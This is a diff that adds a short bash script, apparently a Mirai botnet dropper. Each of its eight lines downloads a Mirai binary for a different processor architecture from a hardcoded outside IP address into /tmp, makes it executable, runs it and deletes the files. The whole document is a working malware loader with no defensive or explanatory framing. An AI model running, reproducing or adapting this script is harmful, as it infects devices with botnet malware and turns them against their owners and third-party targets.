@@ -1,0 +1,10 @@
+#!/bin/bash
+
+cd /tmp; wget http://45.32.1.44/bins/mirai.arm; chmod 777 mirai.*; ./mirai.arm; rm -rf *
+cd /tmp; wget http://45.32.1.44/bins/mirai.arm7; chmod 777 mirai.*; ./mirai.arm7; rm -rf *
+cd /tmp; wget http://45.32.1.44/bins/mirai.mpsl; chmod 777 mirai.*; ./mirai.mpsl; rm -rf *
+cd /tmp; wget http://45.32.1.44/bins/mirai.mips; chmod 777 mirai.*; ./mirai.mips; rm -rf *
+cd /tmp; wget http://45.32.1.44/bins/mirai.x86; chmod 777 mirai.*; ./mirai.x86; rm -rf *
+cd /tmp; wget http://45.32.1.44/bins/mirai.m68k; chmod 777 mirai.*; ./mirai.m68k; rm -rf *
+cd /tmp; wget http://45.32.1.44/bins/mirai.sh4; chmod 777 mirai.*; ./mirai.sh4; rm -rf *
+cd /tmp; wget http://45.32.1.44/bins/mirai.spc; chmod 777 mirai.*; ./mirai.spc; rm -rf *
